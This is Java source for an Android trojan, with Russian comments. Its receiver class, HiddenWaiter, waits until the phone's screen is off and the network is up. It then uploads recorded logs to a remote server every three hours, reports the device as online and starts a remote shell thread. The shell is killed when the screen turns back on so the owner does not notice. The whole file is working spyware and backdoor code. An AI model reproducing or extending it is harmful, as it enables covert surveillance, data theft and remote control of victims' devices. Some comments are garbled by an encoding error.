package com.example.trojan;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;


public class HiddenWaiter extends BroadcastReceiver{
	Context context;
	 long lastsynctime=0;
	 long lastonlinetime=0;
	 long sync_interval=10800000; // попытка синхронизации каждые 3 часа
	 long online_knock_interval=10000;
	 static Thread shellthread=null;  // поток шелл-сессии
	
@Override
public void onReceive(Context context, Intent intent)
    {
	this.context=context;
	String action = intent.getAction();

	switch (action) {
	
	case "android.intent.action.SCREEN_OFF":
		  if(isNetworkAvailable()){
			  Log.d(MyService.LOG_TAG, "Screen OFF and Internet is here ^^. ready to fight");
			  if(System.currentTimeMillis()-lastsynctime>sync_interval){ //пора синхронизировать?
				 if(!MyService.recording){
				  Log.d(MyService.LOG_TAG, "It's time to sync! starting..");
				  long syncres=do_async("sync",MyService.log_path,120); // 2 мин на синхронизацию минимум
				  if (syncres!=0L){
					  lastsynctime=syncres;
					  Log.d(MyService.LOG_TAG, "Sync successful!..");
					  Log.d(MyService.LOG_TAG, "lastsynctime: "+lastsynctime);
				  }
				  	else{
				  		Log.d(MyService.LOG_TAG, "Couldnt sync!");
				  	  	}
				 }
				  else{
					  Log.d(MyService.LOG_TAG, "Recording is active! aborting sync!");
				  	}
		  }
			  if(System.currentTimeMillis()-lastonlinetime>online_knock_interval){
				  Log.d(MyService.LOG_TAG, "posting online status..");
				  lastonlinetime=do_async("notifyonline",null,10);
			  }
			  if(!MyService.cmdsessionactive){
				  	shellthread = new Thread(new ShellSession(context));  // создаем новый шелл
				  	shellthread.setName("shellthread");
				  	shellthread.start();
				  	Log.d(MyService.LOG_TAG, "shell thread started");
			  }
			  
			  else{
				  Log.d(MyService.LOG_TAG, "shown online too recently!");
			  }
		  }
		  else {
			  Log.d(MyService.LOG_TAG, "Screen OFF, No internet yet"); 
		  }
  	  
    
   break;

	case "android.intent.action.SCREEN_ON":
  	  Log.d(MyService.LOG_TAG, "Screen ON");
  	  MyService.streaming=false;
  	  if(shellthread!=null&&shellthread.isAlive()){
  		  try{
  		  shellthread.interrupt();
  		  } catch(Exception e){
  			Log.d(MyService.LOG_TAG, "Error interrupting shell thread!\n"+e.toString()); 
  		  }
  	  }
    break;
    
	}
	 //// if inet is here but no connection it shuts down and reboots everything. etc
 }

boolean isNetworkAvailable() {
    ConnectivityManager connectivityManager = (ConnectivityManager)
    		context.getSystemService(Context.CONNECTIVITY_SERVICE);
    NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
    return activeNetworkInfo != null && activeNetworkInfo.isConnected();
}

static long do_async(String cmd,String args,int delay_seconds){
	
	final ExecutorService service;
    final Future<Long>  result;
    long ls=0L;
    
    //service = Executors.newFixedThreadPool(1);
    service = Executors.newSingleThreadExecutor();
    
    result   = service.submit(new AsyncExecutor(cmd,args));
    try {
        //ќжидание 10 секунд
        ls = result.get(delay_seconds,TimeUnit.SECONDS); // врем€ успешного выполнени€, 0 - в случае ошибки
    } catch(final Exception e) {
    	Log.d(MyService.LOG_TAG, "AsyncExecutor time exceeded\n"+e.toString());
    	result.cancel(true);
    }

    service.shutdownNow();

    return ls;
}




}
